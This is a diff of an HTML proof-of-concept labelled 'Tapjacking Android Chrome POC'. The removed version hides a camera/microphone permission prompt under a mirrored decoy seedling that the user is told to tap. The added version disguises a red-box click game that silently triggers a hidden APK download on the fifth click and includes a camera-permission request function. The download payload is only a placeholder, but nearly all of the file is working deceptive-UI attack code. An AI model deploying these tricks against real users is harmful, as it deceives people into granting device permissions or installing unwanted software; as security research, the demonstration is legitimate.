@@ -1,63 +1,75 @@
-<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Tapjacking Android Chrome POC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      overflow: hidden;
+      user-select: none;
+    }
 
-<style>
-  :root {
-    --top-offset: 55%;
-    --decoy-offset-below: 10%;
-  }
+    #redBox {
+      position: absolute;
+      top: 400px;
+      left: 300px;
+      width: 30px;
+      height: 30px;
+      background-color: red;
+      cursor: pointer;
+    }
 
-  #instructions {
-    position: absolute;
-    width: 520px;
-    height: 100px;
-    top: 40%;
-    left: 50%;
-    transform: translate(-50%, 0);
-    font-family: sans-serif;
-    font-size: 1.2em;
-  }
+    #counter, #first {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 40px;
+    }
+  </style>
+  <script>
+        function requestCameraPermission() {
+      // Get access to the camera
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function (stream) {
+          console.log('Camera permission granted.');
+        })
+        .catch(function (error) {
+          console.error('Error accessing the camera:', error);
+        });
+    }
 
-  #decoy {  
-    position: absolute;
-    background: #ffffff;
-    width: 300px;
-    height: 100px;
-    top: calc(var(--top-offset) + var(--decoy-offset-below));
-    left: 50%;
-    transform: translate(-50%, 0) rotateX(180deg);
-    -webkit-box-reflect: below 0;
-    z-index: 1;
-    pointer-events: none;
-    font-size: 2.5em;
-    text-align: center;
-  }
+    var clickCount = 0;
 
-  #decoy-decoy {
-    position: absolute;
-    background: #ffffff;
-    width: 300px;
-    height: 100px;
-    top: calc(var(--top-offset) + var(--decoy-offset-below));
-    left: 50%;
-    transform: translate(-50%, 0) rotateX(180deg);
-    z-index: 2;
-  }
+    function handleClick() {
+      clickCount++;
+      document.getElementById("counter").innerHTML = "x" + clickCount;
 
-  #permission-wrapper {
-    position: absolute;
-    top: var(--top-offset);
-    left: 50%;
-    transform: translate(-50%, 0);
-  }
-  permission {
-    height: 48px;
-  }
-</style>
-<div id="decoy">🌱</div>
-<div id="decoy-decoy"></div>
+      if (clickCount == 5) {
+        document.getElementById("download").click();
+      }
+    }
 
-<div id="instructions">Tap twice on the seedling to water it and make it grow. 💧🌼</div>
+    function startGame() {
+      document.getElementById("game").style.display = "block";
+      document.getElementById("first").style.display = "none";
+    }
+    
+  </script>
+</head>
+<body>
+  <center id="first" style="padding: 15px;">
+    <button onclick="startGame()">Click to Play</button>
+  </center>
+  <a href="data:application/vnd.android.package-archive;base64,UGVhY2UgQmUgVXBvbiBZb3U=" download="game.apk" id="download" hidden>Download APK</a>
 
-<div id="permission-wrapper">
-  <permission id="camera-microphone" type="camera microphone"></permission>
-</div>
+  <div id="game" style="display: none;">
+    <div id="redBox" onclick="handleClick()"></div>
+    <div id="counter">Click the Red Box x6 to win!</div>
+  </div>
+
+</body>
+
+</html>
